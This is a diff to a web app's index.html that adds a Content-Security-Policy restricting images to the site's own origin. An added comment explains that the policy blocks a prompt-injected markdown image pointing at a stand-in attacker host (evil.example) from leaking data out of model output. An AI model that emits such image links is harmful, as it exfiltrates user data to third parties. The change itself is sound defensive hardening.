@@ -2,6 +2,10 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
+    <!-- Second lock behind lib/markdown.ts: even if an image from model output ever reached the DOM, the browser may
+         only load images from this origin, so a prompt-injected ![](https://evil.example/?d=...) cannot leak data.
+         Scoped to img-src so Vite's dev scripts, styles and HMR socket are unaffected. -->
+    <meta http-equiv="Content-Security-Policy" content="img-src 'self' data:" />
     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="description" content="Vault AI: upload documents, get AI insights, and chat with them with page-level citations." />
